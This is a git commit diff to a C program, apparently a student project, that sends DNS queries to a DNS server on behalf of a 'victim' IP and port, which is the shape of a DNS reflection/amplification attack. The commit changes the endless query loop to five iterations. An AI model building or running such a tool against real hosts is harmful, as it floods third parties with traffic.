b590f9c47516b95b41621195a5ea866294fd9081
marmot0814 <s1357andy871207@gmail.com>
2019-03-21 20:21:20 +0800

    5 times

--- project1/main.c
+++ project1/main.c
@@ -7,7 +7,7 @@ int main(int argc, char **argv) {
 		printf("Usage: %s <Victim IP> <Victim Port> <DNS server IP> <DNS Query> <Type Default=255>\n", argv[0]);
 		exit(-1);
 	}
-	for (int i = 0 ; ; i++) {
+	for (int i = 0 ; i < 5 ; i++) {
 		sendDNSQuery(argv[1], atoi(argv[2]), argv[3], 53, argv[4], argc == 5 ? 255 : atoi(argv[5]));
         sleep(2);
 	}
